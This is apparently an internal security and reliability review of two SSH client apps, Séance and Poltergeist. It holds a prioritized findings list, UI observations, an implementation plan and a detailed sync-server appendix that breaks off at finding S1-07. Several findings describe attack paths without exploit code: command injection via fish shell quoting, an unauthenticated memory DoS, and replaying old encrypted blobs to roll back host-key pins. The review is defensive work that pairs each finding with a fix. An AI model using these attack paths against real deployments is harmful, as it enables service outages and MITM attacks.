# Séance + Poltergeist: deep review (2026-09-26)

Reviewed `L-K-M/Seance` main at `dd7e105` and `L-K-M/Poltergeist` main at
`913ca3d`. Nothing in this document has been implemented yet; the plan for
what gets implemented is in section 5. Everything else is backlog.

## 0. How this review was done

- Ten read-only review slices ran in parallel. Five covered Séance: protocol,
  sync and server (S1); core SSH, SFTP, git and LLM (S2); app services and state
  (S3); UI, theming and the terminal fork (S4); and an audit of the existing
  `ANALYSIS.md` against current code (S5). Four covered Poltergeist: core
  connection, engine, FS and checkout (P1); transfer queue and sync engine (P2);
  app services (P3); and UI and theming (P4). One (X) covered cross-sibling drift,
  CI and release, platform folders and docs.
- Every finding has file:line evidence and a confidence tag. VERIFIED means the
  reviewer traced the code path or reproduced the bug with a scratch test; LIKELY
  and SPECULATIVE mean what they say. Reproductions ran in scratch copies, never
  in the repos.
- I also built the Séance Linux app (Flutter 3.47.2), ran it under Xvfb against
  a local OpenSSH 9.6 server, and drove it with xdotool: add server, TOFU,
  password auth, a terminal session, and resizes to 420 and 1000 px. Section 3
  lists what I saw.
- Baseline on this container (Flutter 3.47.2, Dart 3.13.2, Ubuntu 24.04, root):
  - Séance: package analysis clean, 778 package tests pass; app analysis clean,
    1,083 app tests pass.
  - Poltergeist: package and app analysis clean; 2,786 app tests pass.
    `poltergeist_core` has two failures (`checkout_manager_test.dart` "review
    hardening … cleanup fails"). Both are environment artifacts: they inject
    faults with `chmod 500`, and root ignores that. They should skip when
    `euid == 0` (test hygiene, P3).
- Not verified: real macOS, Windows, iOS or Android devices; signed Apple
  keychains; Docker at runtime; real network latency. The S2 slice was cut short
  after its third detailed entry. Its complete findings table and summary are
  kept below, but entries S2-04 to S2-22 have only their table rows, and each
  needs its evidence re-traced before implementation.

## 1. Executive summary

Both codebases are careful, heavily commented and heavily tested; the earlier
review rounds show. The remaining defects sit at seams between subsystems and in
failure and recovery paths. Rare I/O, keystore or protocol errors turn into
permanent loss there, and adversarial input (a hostile server, terminal output,
odd file names) reaches places that assumed friendly input.

**Séance: the most important open problems**

1. **Remote command injection for fish users** (S2-01, P1). POSIX quoting is not
   fish-safe. An OSC 7 path printed by any program makes the Git tab's background
   probe run attacker commands. Verified with fish 3.7.
2. **Upload "Replace" over a symlink creates a mode-0777 regular file** (S2-02,
   P1). The shared core code also affects Poltergeist.
3. **Unauthenticated memory DoS on the sync server** (S1-01, P1). Measured at
   112 MiB per 8 MiB request. Unbounded usernames also accumulate in the rate
   limiter (S1-06).
4. **One refused record stops all inbound sync on a device** (S1-04, P1,
   reproduced).
5. **Managed edits deleted on the second launch after an index quarantine**
   (S3-01, P1, reproduced). One stuck checkout also blocks app start (S3-03).
6. **Keystore loss mints a new key over an existing vault** (SOL-031). There are
   concrete Android (auto backup, `resetOnError`) and Windows (DPAPI) triggers
   (S3-04, X-10).
7. **Failed enrolment leaves sync configured with the wrong key**, which poisons
   the account (S3-02 / SOL-030 residual). A mistyped encryption passphrase on
   an empty account also goes undetected (S1-05).
8. **Privacy: "Include terminal output" resets to ON** when the Assistant drawer
   remounts (S4-04).
9. **No quit guard** (S3-07/S4-08): unsaved editor buffers and live sessions are
   dropped on ⌘Q.
10. **Still open from the earlier backlog** (S5 audit): unauthenticated record
    metadata (SOL-011), synced host keys overwriting local pins (AST-008),
    plaintext bearer tokens (SOL-048), no scrollback search or tab shortcuts, and
    the unbounded CSI REP (AST-015).

**Poltergeist: the most important open problems**

1. **Sync Mirror deletes real destination files behind a source symlink**
   (P2-02, P1, reproduced). A replaced directory's children are also not
   subsumed; they delete even while the conflict is unresolved (P2-03).
2. **Default "ask" folder policy silently drops subfolders** (P2-01, P1,
   reproduced). The task still ends "completed".
3. **Failed sync update with trash backups strands the file** (P2-04, P1).
4. **Journal compaction thrash** (P2-05, P1): once a live task passes about 5k
   files, every append rewrites and fsyncs the whole journal on the UI isolate.
5. **Engine isolate death is fatal and unobserved** (P1-01): one malformed SFTP
   packet kills every pane, including local ones.
6. **Edited server configs are ignored for the session** (P1-02, reproduced).
7. **Remote files are OS-launched under their original extension** (P1-03). On
   Windows, double-clicking a remote `.js` or `.hta` runs it.
8. **Cross-app data loss:** Poltergeist's editor drops `jumpHostId` on save and
   pushes the loss to Séance (X-02). `ServerConfig` discards unknown keys (X-03).
   Poltergeist also reopens stale checkouts, a missed port of Séance #105 (X-01).
9. **rsync exporter mis-escapes remote-pair filters** (P2-07). The generated
   Mirror command would delete the engine's trash folder.
10. **Daily keyboard flow:** filter focus is stranded (P4-01), up and back lose
    your place (P4-02), and PageUp/Down do nothing (P4-03). Names truncate at the
    end, hiding extensions (P4-04). Dates are always US format (P4-07).

## 2. Prioritized cross-repo list (top 30)

IDs refer to the detailed reports in the appendices.

| # | Repo | ID | Sev | Title | Effort |
|---|---|---|---|---|---|
| 1 | Séance | S2-01 | P1 | Fish-unsafe quoting lets terminal output inject remote commands via the git probe / staged `cd` | S |
| 2 | Séance (core, shared) | S2-02 | P1 | Upload replace over a symlink → 0777 regular file; mode type bits sent | S |
| 3 | Poltergeist | P2-02 | P1 | Mirror deletes the destination's real directory under a source-side symlink | S–M |
| 4 | Poltergeist | P2-03 | P1 | Replaced directory's destination-only descendants not subsumed | M |
| 5 | Poltergeist | P2-01 | P1 | Subfolders of a parked/failed folder skipped for good | M |
| 6 | Séance | S3-01/S3-03 | P1 | Managed checkouts swept after index quarantine; one bad checkout blocks startup | S–M |
| 7 | Séance | S1-01/06/15 | P1 | Unauthenticated body/username bounds on the sync server | S |
| 8 | Séance | S1-04 | P1 | One 413-refused record blocks every inbound apply | M |
| 9 | Poltergeist | P2-04 | P1 | Trash-backup update failure strands the destination | M |
| 10 | Poltergeist | P2-05 | P1 | Journal compaction thrash (whole-file rewrite per append) | S–M |
| 11 | Poltergeist | P1-02 | P1 | Stale server config after edit | S |
| 12 | Poltergeist | P1-03 | P1 | Remote Open launches executables by extension | S–M |
| 13 | Poltergeist | P1-01 | P1 | Engine isolate: guard uncaught errors, observe termination, respawn | M |
| 14 | Poltergeist | X-02/X-05 | P2 | Editor drops `jumpHostId`; jump routes dialed directly | S |
| 15 | Séance (protocol) | X-03 | P2 | Preserve unknown `ServerConfig` keys across old clients | M |
| 16 | Poltergeist | X-01 | P2 | Reopened checkout not refreshed (port Séance #105) | M |
| 17 | Poltergeist | P2-07 | P1 | rsync exporter filter/remote-path escaping | S |
| 18 | Séance | S4-04 | P1 | Persist the assistant's terminal-output opt-out | S |
| 19 | Séance | S3-07/S4-08 | P2 | Quit guard (port Poltergeist's `QuitGuard`) | S–M |
| 20 | Poltergeist/Séance | P3-05 | P1 | Vault/pin stores quarantine on a transient read error | S |
| 21 | Poltergeist | P3-07 | P2 | Quarantined bookmarks.json erases saved-workspace details | S |
| 22 | Séance | S3-04/X-10 | P1 | Android backup rules + `resetOnError:false` + never mint over an existing vault | S–M |
| 23 | Séance | S3-02/S1-05 | P1 | Enrolment ordering + vault-key check canary | M |
| 24 | Poltergeist | P2-06 | P1 | Within-task case/NFC collisions resolved as ordinary conflicts | M |
| 25 | Séance | S4-07 | P2 | New tab reuses the stale connect-time config | S |
| 26 | Séance | S4-01 | P2 | Style value equality in the fork (per-notify glyph cache flush) | S |
| 27 | Séance | SEA-023 | P1 | Terminal scrollback search | M |
| 28 | Séance | SEA-025 | P1 | Tab navigation shortcuts (close / next / previous / 1–9) | S–M |
| 29 | Poltergeist | P4-01/02/03 | P2 | Keyboard flow pack (filter focus return, keep place on up/back, PageUp/Down) | S–M |
| 30 | Poltergeist | P4-04 | P2 | Middle-ellipsis file names (keep extension) | S |

## 3. Live-app observations (Séance on Linux, my own run)

These come from running the real debug build against OpenSSH 9.6, not from
reading code. Labels are L-xx.

| ID | Sev | Observation | Suggested fix |
|---|---|---|---|
| L-01 | P3 | **Label is required** in Add server; saving with host, user and password but no label shows "Required". | Default the label to `host` (or `user@host`) when blank, with a hint "Defaults to the host". The server list already shows `user@host:port` as the second line. |
| L-02 | P2 | **New servers default to ssh-agent auth**, even on a machine with no agent. The first connect fails for a user who didn't notice the dropdown. This compounds X-06 (macOS sandbox) and S2-16 (mobile has no agent). | Default to agent only when an agent is reachable (`SSH_AUTH_SOCK` set and the socket exists, or the Windows pipe exists). Otherwise default to Password. Mobile never defaults to agent. |
| L-03 | P3 | The error toast (keyring unavailable) sits on top of the dialog's title ("Add server"). | Offset top notices below an open dialog's title area, or show dialog-scoped errors inline in the dialog. |
| L-04 | P2 | At a 1000 px window the utility pane (about 280 px) plus the sidebar leaves the terminal about 480 px, fewer than 80 columns. The utility tab label truncates to "Snipp…". Known as SOL-039; confirmed live. | A collapse toggle for the utility pane (persisted), and auto-collapse below about 1100 px. |
| L-05 | P3 | The utility pane repeats its tab name as a heading ("Snippets" tab, then a "Snippets" header). Known. | Drop the inner heading and move the "+" into the tab row or the filter row. |
| L-06 | P3 | The sidebar bottom bar's density switch is two tiny, similar list glyphs next to a gear, with unclear affordance at 12 px. | One segmented toggle with tooltips, or move it to the View menu and settings. |
| L-07 | P3 | With servers present and nothing selected, the main area says "Select a server to open a session" and offers nothing clickable. | Show recent servers as buttons plus a quick-connect field (see S4 "Quick connect in the filter"). |
| L-08 | P3 | The terminal and its OSC title work well: the tab retitles to `tester@vm: ~`, the status ring turns green, and the footer shows the endpoint. No defects seen in basic interaction. | — |

(Poltergeist was screenshotted by the P4 slice through widget tests, not a
native build.)

## 4. Consolidated ideas (novel, delightful, quirky)

These are gathered from every slice, with duplicates merged. Each has a first
useful slice in the originating report.

**Séance**
- **Quick connect in the filter:** typing `user@host[:port]` shows a
  "Connect to …" row (S4, backlog "Quick connect").
- **Scrollback search with scrollbar ticks:** hits drawn in an overview strip
  (S4, SEA-023).
- **"Jump to live" pill:** a "↓ 37 new lines" pill while scrolled up (S4,
  AST-011).
- **Tab switcher ("séance table"):** ⌃Tab lists every tab with its live dot and
  cwd (S4).
- **Production tint:** a 3–4% server-hue wash on the terminal of prod-coloured
  servers, plus confirmation on reviewed destructive commands (S4, "Production
  wards").
- **"Close the circle?" quit ritual:** the quit guard lists live sessions and
  dirty buffers (S3).
- **Recovered edits drawer:** one place for orphaned managed checkouts (S3,
  S3-12).
- **Account sigil:** a stable word-triple rendered from the vault key-check, so
  two devices can be compared at a glance (S3, S1-05).
- **Polite probing:** exponential per-host backoff for unreachable hosts (S3).
- **Linux terminal conventions:** opt-in copy on select and middle-click paste
  (S4).
- **"Who changed this?" sync receipts:** device and time per record (S1).
- **Rollback tripwire:** detect a server that regresses its `latestSeq` (S1,
  S1-03).
- **Account doctor endpoint:** record, byte and limit stats per account (S1).

**Poltergeist**
- **Engine watchdog with state replay:** respawn the engine and replay pins and
  bindings (P1).
- **"Settings changed, reconnect?" chip** on panes of an edited server (P1).
- **Mark of the Web / quarantine xattr** on everything that leaves a remote
  (P1).
- **Randomart plus SSHFP check** in the TOFU dialog (P1, also Séance's
  "fingerprint spirit sigils").
- **"Where was I" folder memory, ghost rows for incoming files, compare panes
  at a glance, "recently haunted" dots, hold-⌘ shortcut hints, path-field Tab
  completion** (P4).
- **Viewport-exact restore; rename-aware relocation across stores; ASCII fast
  lane for folds; backup heartbeat chip; Quick Look next-row prefetch;
  per-task transfer sparkline** (P3).
- **Transfer receipts (JSONL manifest); chaos property test for moves; rsync
  exporter self-check in CI; `fsync@openssh.com` before deleting a moved local
  source; opt-in NFC-on-upload** (P2).

**Both apps**
- **Handoff URLs** (`seance://`, `poltergeist://`): "Open a terminal here" and
  "Browse this directory" (X).
- **Drag from Poltergeist onto a Séance terminal** to paste a shell-quoted
  remote path (X).
- **One theme for the family**, with a shared theme JSON (X).
- **Downstream canary:** Séance CI builds Poltergeist against the PR's
  `seance_core` (X). This catches X-04/X-25-style breaks before a tag.
- **Mechanical shared-file guard:** a manifest plus a CI hash check for the
  byte-identical files (X).
- **Port Séance's Android keep-alive service** to Poltergeist transfers (X).

## 5. Implementation plan (this session)

Each item becomes its own branch and PR against `main`, and each PR stays open
for owner review. Order: data safety and security first, then daily-use
features. Every bug fix starts with a failing regression test.

**Séance**
1. Dialect-neutral shell quoting for the git probe and the staged `cd` (S2-01).
2. Refuse replacing a symlink on upload; send permission bits only (S2-02).
3. Sync server: small cap on the auth routes, byte-buffered bodies, username
   validation, typed 400 for bad JSON types (S1-01/06/15).
4. Keep applying pulled records when one record is refused (S1-04).
5. Managed-checkout store resilience: never sweep after a quarantined or missing
   index; don't let one checkout block startup (S3-01/S3-03).
6. Persist the assistant's "Include terminal output" opt-out (S4-04).
7. New tab uses the current server config (S4-07).
8. Terminal scrollback search (SEA-023).
9. Tab navigation shortcuts (SEA-025 navigation slice).
10. Quit guard for dirty editors and live sessions (S3-07/S4-08).
11. Bound CSI REP work in the terminal fork (AST-015).
12. Value-equal terminal styles in the fork (S4-01).
13. Git porcelain v2 `-z` header parsing (S2-04).

**Poltergeist**
1. Invalidate the engine's cached server config on edit (P1-02).
2. Mirror never deletes through a source-side symlink (P2-02).
3. Subsume replaced directories' descendants in the differ (P2-03).
4. Stop journal compaction thrash (P2-05).
5. rsync exporter escaping for remote pairs (P2-07).
6. Guard against launching remote executables (P1-03).
7. Keep `jumpHostId` on save and refuse unsupported jump routes (X-02/X-05).
8. Don't wipe saved workspaces when bookmarks.json is quarantined (P3-07).
9. Treat transient read errors as I/O errors, not corruption, in the vault and
   pin stores (P3-05).
10. Filter focus returns to the listing; up and back keep your place (P4-01/02).
11. Keyboard pack: PageUp/Down, numpad Enter, type-ahead Backspace, Esc
    deselect (P4-03/10/11/16).
12. Middle-ellipsis file names (P4-04).
13. Subfolders of a parked folder wait instead of being skipped (P2-01).

Anything not merged or not attempted stays in `ANALYSIS.md` as shovel-ready
entries.

---

# Appendices: full slice reports

The reports below are kept verbatim. Paths are relative to each repo root.

---

## S1 review: Séance protocol, sync server, core sync (2026-09-26)

Scope: `packages/seance_protocol`, `packages/seance_sync_server` (server,
storage, SQLite, limiter, config, Dockerfile, compose, `update.sh`),
`packages/seance_core/lib/src/sync`. Source base: `dd7e105` (read-only
checkout). Where an app or Poltergeist file is the consumer that makes a
slice bug real, it is cited.

Probes (all run in a copy, not the checkout) live in
`scratchpad/work-S1/packages/seance_sync_server/test/s1_probe_test.dart`,
`.../s1_oversize_probe_test.dart`,
`scratchpad/work-S1/packages/seance_core/test/s1_replay_probe_test.dart`,
`.../s1_counts_probe_test.dart`, and
`scratchpad/work-S1/packages/seance_sync_server/tool/{mem_probe,limiter_probe}.dart`.
Toolchain: Dart 3.13.2 from `/opt/flutter`, system `libsqlite3.so.0`.

### 1. Summary

The code is careful and heavily commented. The atomic LWW and snapshot work
(#71) holds up, the push batcher is correct, and the coordinator's
tombstone, exclusion and secret shields are carefully built. The biggest
remaining risks sit **at the edges**:

- **Unauthenticated DoS.** Every unauthenticated endpoint reads bodies of
  up to 8 MiB into a `List<int>`. Measured: about 112 MiB RSS per request,
  414 MiB for 4 parallel requests. Unbounded usernames also become
  rate-limiter keys that stay in memory (measured: 235 MiB retained after
  200 requests).
- **Replay of an old blob under a later date.** A breached server can
  re-serve an old sealed blob with a later envelope date. That silently
  rolls a rotated host-key pin back to the old key (reproduced). The root
  cause is known (SOL-011/AST-008), but a zero-wire-change mitigation
  exists: bind the payload stamp to the envelope, as secrets already do.
- **Cursor regression is invisible.** The server cannot signal that a
  client's cursor is ahead of it (after delete and re-register, or a
  restored backup). Poltergeist persists its cursor, so today it silently
  stops receiving records (reproduced). Its `SyncCursorRejectedException`
  fallback is dead code because nothing throws it.
- **One refused record blocks all inbound sync.** A single record the
  server refuses with 413 aborts `SyncCoordinator.run` before
  `applyToStores`. That device then never applies another device's edits
  or deletes (reproduced).
- **Wrong encryption passphrase goes undetected.** Enrolment verifies the
  encryption passphrase against the first live record only. On an empty
  account there is nothing to check, so a mistyped passphrase is adopted
  and the device writes under a different key from then on.

### 2. Findings

| ID | Title | Sev | Category | Status | Confidence |
|---|---|---|---|---|---|
| S1-01 | Unauthenticated 8 MiB bodies buffered as `List<int>` (~14x memory amplification) | P1 | security (DoS) | NEW | VERIFIED (measured) |
| S1-02 | Old sealed blob replayed under a later envelope date rolls back host-key pins and configs | P1 | security | KNOWN root cause (SOL-011, AST-008); NEW mitigation | VERIFIED (repro) |
| S1-03 | Cursor regression (delete+re-register, DB restore) never signalled; persistent-cursor clients silently stop receiving | P1 | stability/data-safety | NEW | VERIFIED (repro) |
| S1-04 | One record refused with 413 blocks every inbound apply and tombstone prune on that device | P1 | bug | NEW | VERIFIED (repro) |
| S1-05 | Enrolment cannot verify the encryption passphrase on an empty account; only checks the first record | P2 | stability/data-safety | NEW | VERIFIED (code trace) |
| S1-06 | Usernames unvalidated (empty, NUL, 100k chars); huge usernames become retained limiter keys | P2 | security | NEW (extends KNOWN SOL-049) | VERIFIED |
| S1-07 | Push racing account deletion writes orphans; a re-registration inherits them and the old seq | P2 | stability/data-safety | KNOWN (SOL-051) + new repro | VERIFIED (repro) |
| S1-08 | Snippet edits stamped with raw `now` (no monotonic clamp) get reverted under clock skew | P2 | bug (data loss) | NEW | VERIFIED (code trace) |
| S1-09 | Storage failure leaves process up and `/healthz` 200: permanent 503 outage with a "healthy" container | P2 | stability | KNOWN (SOL-052) + concrete fix | VERIFIED (code) |
| S1-10 | Full pull every run under a 30 s whole-response timeout: large accounts never sync on slow links | P2 | performance | KNOWN (SOL-001, SOL-050) + quantification | LIKELY |
| S1-11 | Salt/verifier lengths unchecked on both sides (empty salt and verifier accepted) | P2 | security | KNOWN (SOL-014 residual) | VERIFIED |
| S1-12 | Idle sync reports "pulled N" (own echoes) and always spends 2 rounds | P3 | UX/performance | NEW | VERIFIED (repro) |
| S1-13 | Client-supplied `seq` decides exact LWW ties on the server | P3 | bug | KNOWN (SOL-013) | VERIFIED (repro) |
| S1-14 | Compose hard-codes `SEANCE_OPEN_REGISTRATION: "false"`; enrolling means editing a tracked file | P3 | UX/ops | NEW | VERIFIED |
| S1-15 | `prelogin` with non-string username returns 500 | P3 | bug | KNOWN (SOL-049) | VERIFIED |

---

#### S1-01: Unauthenticated 8 MiB bodies buffered as `List<int>`
- **Severity** P1 · **Category** security (DoS) · **Status** NEW · **Confidence** VERIFIED (measured)
- **Location** `packages/seance_sync_server/lib/src/server.dart:240-272`
  (`_readJson`, `_readBounded`), called unauthenticated from `_register`
  (:80), `_prelogin` (:121) and `_login` (:137);
  `lib/src/config.dart:97-99` (one cap for all routes).
- **Evidence**
  ```dart
  final bytes = <int>[];
  await for (final chunk in req.read()) {
    bytes.addAll(chunk);            // 8 bytes/element on 64-bit VM + growth slack
  ```
  `tool/mem_probe.dart` against the AOT-compiled server, bodies just under
  8 MiB to `/v1/login`, all answered 400:

  | Parallel requests | `List<int>` (current) | `BytesBuilder(copy:false)` |
  |---|---|---|
  | 1 | +112 MiB | +40 MiB |
  | 4 | +414 MiB | +116 MiB |
  | 8 | +517 MiB | +197 MiB |

  The body is read in full before JSON is parsed or any limiter runs.
- **Failure scenario** The server sits behind an internet-facing reverse
  proxy, as the README recommends. A handful of scripted clients stream
  8 MiB bodies to `/v1/login` in a loop. RSS climbs past a small VPS or
  container memory limit, and the OOM killer ends the process. Compose's
  `restart: unless-stopped` turns this into a crash loop. No credentials
  are needed.
- **Fix**
  1. `_readBounded`: use `BytesBuilder(copy: false)` and
     `utf8.decode(builder.takeBytes())`.
  2. Give `_readJson` a `maxBytes` parameter. Auth routes (`register`,
     `prelogin`, `login`) pass a small constant, e.g.
     `_maxAuthBodyBytes = 16 * 1024`. A register body is under 1 KiB.
     `_push` keeps `settings.maxBodyBytes`.
  3. Check the declared `Content-Length` against the per-route cap too.
  - Tests in `server_test.dart`: a 17 KiB `/v1/login` body returns 413;
    a normal login still returns 200; a 17 KiB push still returns 200 or
    400 (push cap unchanged).
- **Effort** S

#### S1-02: Old sealed blob replayed under a later envelope date
- **Severity** P1 · **Category** security · **Status** KNOWN root cause (SOL-011, AST-008); NEW exploit path and mitigation · **Confidence** VERIFIED (repro)
- **Location**
  - `packages/seance_core/lib/src/sync/sync_coordinator.dart:609-650`
    (config and host-key apply) and `:653-671` (snippet): the payload's
    own stamp is never compared with the envelope's.
  - Contrast `:875-883`, where secrets *do* check
    `secret.updatedAt != dec.updatedAt`.
  - The envelope stamp is unauthenticated:
    `packages/seance_protocol/lib/src/records/record_codec.dart:26-39`.
- **Evidence** `s1_replay_probe_test.dart` prints
  `after repin: SHA256:NEW` then `after replay: SHA256:OLD`.
  - The pin for host `h` is published at pinnedAt=10 with key OLD, then
    re-pinned at 20 with key NEW.
  - The server re-serves the stored OLD blob with `updatedAt: 1<<50`.
  - The device's pin goes back to OLD with no prompt.
- **Failure scenario** Someone with the server database or its backups
  keeps old ciphertext for `hostkey:<host>:<port>`. After the host rotates
  its key (for example because the old key leaked), they replay the old
  blob with a boosted date. Every device silently re-trusts the old key,
  so a MITM holding it gets no changed-key warning. The same move reverts
  a config's `host` or `port` to an old address, and resurrects old
  snippet bodies. It contradicts the "breach-tolerant blob store" claim.
- **Fix** No wire change; this is an interim step before SOL-011's
  authenticated envelope.
  1. **Poltergeist first:** `keepLocalPin`
     (`Poltergeist/packages/poltergeist_core/lib/src/bookmarks/bookmark_coordinator.dart:475-499`)
     writes envelope `updatedAt: now` beside `data: local.toJson()`, which
     carries the old `pinnedAt`. That is a legitimate
     envelope-newer-than-payload writer. Change it to
     `local.copyWith(pinnedAt: stamp)` (or build a new `HostKey` with that
     stamp) so envelope and payload agree. Ship that first.
  2. **Séance:** add one helper, e.g.
     `bool _stampBoosted(int payloadStamp, int envelopeStamp) => envelopeStamp > payloadStamp;`.
     In `applyToStores`, skip through `skip(...)` when it is true:
     - serverConfig: `pulled.updatedAt`
     - hostKey: `pin.pinnedAt`
     - snippet: `snippet.updatedAt`
     - assistantSettings: `assistant.updatedAt`
     
     Reject only a *boost* (envelope > payload). A lowered envelope only
     makes the record lose, which the server can already cause by
     withholding it.
  - Every current Séance writer (`collectLocal`, `_revive`) already emits
    equal stamps.
  - Tests in `sync_coordinator_test.dart`: the replay probe above expects
    the pin to stay NEW and the id to appear in the skipped diagnostics;
    same shape for config and snippet; an honest newer pin still applies.
  - Residual, to state in the PR: a replay with the *original* stamp still
    loses LWW (harmless), and forged tombstones remain until sealing.
- **Effort** S (Séance) + S (Poltergeist), ordered.

#### S1-03: Cursor regression never signalled; persistent-cursor clients go deaf
- **Severity** P1 (Poltergeist today; latent for Séance once SOL-001 persists the cursor) · **Category** stability/data-safety · **Status** NEW · **Confidence** VERIFIED (repro)
- **Location**
  - `packages/seance_sync_server/lib/src/sqlite_storage.dart:104-110`:
    `deleteAccount` drops the `seqs` row, so a re-created account restarts
    at seq 1.
  - `lib/src/server.dart:177-189`: `_sync` answers any `since`, including
    `since > latestSeq`, with an empty list.
  - `packages/seance_core/lib/src/sync/local_record_store.dart:66-69`:
    `setHighWaterSeq` is monotone.
  - `sync_engine.dart:63-93`: no `latestSeq < since` check.
  - Poltergeist: `persistent_record_store.dart:54-61` defines
    `SyncCursorRejectedException` and `bookmark_coordinator.dart:904-913`
    catches it, but no production code throws it (`HttpSyncTransport` is a
    bare `HttpSyncClient`).
- **Evidence** `s1_probe_test.dart`, "delete account then re-register…":
  device B syncs to cursor 5. The account is deleted and re-registered
  with the same username, and 3 new records are pushed. B's next sync
  prints `pulled=0 ids=[old0..old4] cursor=5`: the new records are never
  delivered.
- **Failure scenario**
  - Poltergeist's "Delete backup account…" followed by re-creating it
    under the same username leaves devices whose persisted cursor is
    ahead.
  - Restoring the SQLite file from last night's backup regresses every
    account's seq. Poltergeist devices then skip every record whose new
    seq is at or below their stale cursor, silently and permanently.
    Séance is immune today only because it rebuilds the mirror from seq 0
    every run.
- **Fix**
  1. Server: in `_sync`, if `since > snapshot.latestSeq`, return
     `409 {"error":"cursor_ahead"}`. Séance's current client never sends
     that (it starts at 0 and only advances to seqs it saw), so nothing
     regresses.
  2. Core: move `SyncCursorRejectedException` into `seance_core` (keep an
     export for Poltergeist), and have `HttpSyncClient.pull` throw it on
     `cursor_ahead`.
  3. `SyncEngine._pullOnce`: on that exception, or when
     `resp.latestSeq < since` (covers old servers), reset the cursor and
     re-pull from 0. Add a `resetHighWaterSeq()` to `LocalRecordStore`;
     the in-memory store already has the field.
  4. Follow-up with SOL-051 schema versioning: a random per-account
     `epoch` returned in `PullResponse`. It also catches a restore where
     the seq has already grown past the stale cursor. Restore procedures
     should rotate the epoch.
  - Tests:
    - server: `since` above latest returns 409 `cursor_ahead`.
    - engine: a cursor of 5 against a `latestSeq` of 3 re-pulls and
      delivers the new records.
    - integration: the probe above passes over real HTTP and SQLite.
- **Effort** M (about 150 lines with tests; coordinate the exception move
  with Poltergeist)

#### S1-04: One record refused with 413 blocks every inbound apply
- **Severity** P1 · **Category** bug · **Status** NEW · **Confidence** VERIFIED (repro)
- **Location**
  - `packages/seance_core/lib/src/sync/sync_engine.dart:112-130`: a
    single-record 413 batch throws by design.
  - `sync_coordinator.dart:1022-1034`:
    `final first = await engine.sync(api);` throws before
    `applyToStores()` and `_pruneConfirmedTombstones()`.
  - The mirror is per-run (`app_services.dart:560`
    `InMemoryLocalRecordStore()`), so everything pulled is thrown away.
- **Evidence** `s1_oversize_probe_test.dart` (server with
  `maxBlobBytes: 64 KiB`):
  - Device B holds a 100 KiB snippet.
  - Device A renames server `s1`.
  - Three runs on B each throw `push 413 … A record blob exceeds`, and B
    still shows `(alpha)` instead of `alpha-renamed`.

  Commit 538859a isolated such records so the *other pushes* land. The
  inbound half was never covered.
- **Failure scenario** A user pastes a large script (over about 1 MiB,
  since snippet bodies have no cap) into a snippet. Or an operator lowers
  `SEANCE_MAX_BLOB_BYTES` below the ~258 KiB a config with an image mark
  seals to. From then on this device never shows other devices' edits or
  deletions, every sync reports an error that does not name the record,
  and nothing guides the user to the fix.
- **Fix**
  - In `SyncEngine._pushOnce`, catch `ApiError` with code
    `payload_too_large` **only for single-record batches**. Record the id
    in a new `SyncOutcome.refused` list, keep it dirty, and continue.
  - In `SyncCoordinator.run`, after `applyToStores`, throw a typed
    `SyncRecordsRefused(ids)` if `refused` is non-empty, so the UI can
    name the record ("Snippet 'deploy.sh' is too large to sync (limit
    1 MiB)"). Alternatively return the outcome and let AppState render it.
  - Separately, add a client-side snippet size guard at save time, derived
    from the advertised `maxBlobBytes`.
  - Tests:
    - core: the probe above; after the run, B shows `alpha-renamed` and
      `refused == ['snippet:big']`.
    - a multi-record 413 (body cap) still throws, preserving the existing
      contract.
- **Effort** S/M (about 120 lines)

#### S1-05: Encryption passphrase unverifiable on an empty account
- **Severity** P2 · **Category** stability/data-safety · **Status** NEW · **Confidence** VERIFIED (code trace)
- **Location**
  - `app/seance_app/lib/services/app_services.dart:488-503` (`loginSync`
    verification loop).
  - `:428-452` (`registerSync` publishes nothing checkable).
- **Evidence**
  ```dart
  for (final record in remote.records) {
    if (record.deleted || record.blob.isEmpty) continue;
    try { await RecordCodec(keys.vaultKey).decrypt(record); } catch (_) { throw ...; }
    break;
  }
  ```
  - With zero live records the loop body never runs. The key is adopted
    and `_rekeyVault` re-seals the local vault under it.
  - Only the *first* record is checked.
- **Failure scenario**
  1. The user registers on a phone with no servers yet.
  2. They enrol a laptop and mistype the separate encryption passphrase.
     Nothing to check, so the key KB is accepted.
  3. The laptop pushes its servers and host keys under KB, and the phone
     pushes under KA.
  4. Shared ids such as `hostkey:host:22` flip-flop between undecryptable
     versions. Each device logs "Skipped synced records" and they diverge
     for good.
  5. A third device enrolling with the *correct* passphrase is refused
     ("could not decrypt this account") whenever the first live record in
     seq order is one of the laptop's.
- **Fix** Add a key-check canary; no enum change is needed.
  - `registerSync` pushes one record, id `keycheck:v1`, sealed as
    `{kind: 'keyCheck', data: {}}` with the new vault key.
    `recordKindFromName('keyCheck')` resolves to `RecordKind.unknown` in
    every build, so all apply paths already skip it, and `collectLocal`
    never republishes it.
  - `loginSync` looks for `keycheck:v1` first and fails closed if it will
    not open. Otherwise it falls back to "any live record". If the account
    is empty, it pushes the canary itself after login.
  - Also check *every* live record in the fallback, not just the first,
    and refuse on a mixed-key account with a clear message.
  - Tests (app services, with fakes): an empty account plus a wrong
    passphrase on the second device is refused; a correct passphrase on a
    mixed account reports a mixed account, not "wrong passphrase".
- **Effort** S/M

#### S1-06: Usernames unvalidated; huge usernames become retained limiter keys
- **Severity** P2 · **Category** security · **Status** NEW (extends KNOWN SOL-049's "unique-key spray") · **Confidence** VERIFIED
- **Location** `server.dart:79-118` (register: no checks on
  `r.username`), `:148` (`loginLimiter.allow('login:${r.username}')`,
  called before the account lookup), `rate_limiter.dart:41-70`.
- **Evidence**
  - `s1_probe_test.dart` registers `""`, `" "`, `"a\u0000b"`, a
    100 000-char name, and both `Alice` and `alice` as separate accounts.
    All return 200.
  - `limiter_probe.dart`: 200 unauthenticated logins with unique 1 MiB
    usernames leave RSS **+235 MiB**, retained for the window, 60 s by
    default. The key size is bounded only by the 8 MiB body cap.
- **Failure scenario**
  - Memory: at 8 MiB usernames, a few requests per second hold gigabytes
    for the whole window. This compounds S1-01.
  - Correctness: NUL or control characters in usernames reach logs and
    SQLite text. Look-alike or case-variant accounts cause "wrong account"
    support confusion.
- **Fix** Add a shared `validateUsername(String)` in `seance_protocol`,
  used by the client (fail fast) and the server (authoritative):
  - 1-64 characters after NFC; no C0/C1 control characters; no
    leading/trailing whitespace.
  - Optional: case-fold for uniqueness, applied at registration only so
    existing accounts are not renamed.
  - Server returns 400 `bad_username` from register, prelogin and login
    *before* the limiter. Key the limiter on a SHA-256 of the username
    anyway, as defence in depth.
  - Tests: each bad form returns 400; a 64-char name works; the limiter
    map holds fixed-size keys.
- **Effort** S

#### S1-07: Push racing account deletion writes orphans that a re-registration inherits
